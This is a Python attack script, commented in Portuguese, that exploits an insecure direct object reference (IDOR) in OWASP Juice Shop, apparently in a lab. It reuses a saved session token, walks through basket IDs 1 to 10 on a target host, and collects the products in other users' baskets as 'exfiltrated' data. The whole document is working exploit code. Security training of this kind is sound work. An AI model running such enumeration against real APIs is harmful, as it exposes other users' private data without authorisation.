import requests
import json
import time

def fuzz_baskets():
    print("[*] Iniciando Campanha de Fuzzing IDOR...")
    
    # 1. Recupera a sessão confirmada
    try:
        with open(".session_token", "r") as f:
            token = f.read().strip()
    except FileNotFoundError:
        print("[-] Erro: Token de sessão não encontrado.")
        return

    # 2. Defesa em Profundidade: O Juice Shop exige o token tanto no Header quanto em um Cookie.
    headers = {"Authorization": f"Bearer {token}"}
    cookies = {"token": token}
    
    exfiltrated_data = []

    # 3. Execução do Loop de Exploração
    for basket_id in range(1, 11):
        url = f"http://target-app-web:3000/rest/basket/{basket_id}"
        print(f"[*] Fuzzing endpoint: {url}")
        
        try:
            res = requests.get(url, headers=headers, cookies=cookies)
            
            # Se a resposta for 200, a API entregou o dado sem validar se somos o dono da cesta
            if res.status_code == 200:
                data = res.json()
                products = data.get('data', {}).get('Products', [])
                
                if products:
                    print(f"[!!!] SUCESSO IDOR: Conteúdo capturado da cesta ID {basket_id}")
                    exfiltrated_data.append({
                        "basket_id": basket_id,
                        "products": [p.get('name') for p in products]
                    })
                else:
                    print(f"[+] Cesta {basket_id} acessível, mas vazia.")
            else:
                print(f"[-] Acesso negado ou cesta inexistente. Status: {res.status_code}")
                
            time.sleep(0.5) # Throttling para não derrubar o laboratório
            
        except Exception as e:
            print(f"[-] Erro de conexão no ID {basket_id}: {e}")

    # 4. Relatório Final de Extração
    print("\n[#] Resumo da Exfiltração via IDOR:")
    if exfiltrated_data:
        print(json.dumps(exfiltrated_data, indent=2))
    else:
        print("[-] Nenhuma cesta preenchida foi localizada.")

if __name__ == "__main__":
    fuzz_baskets()
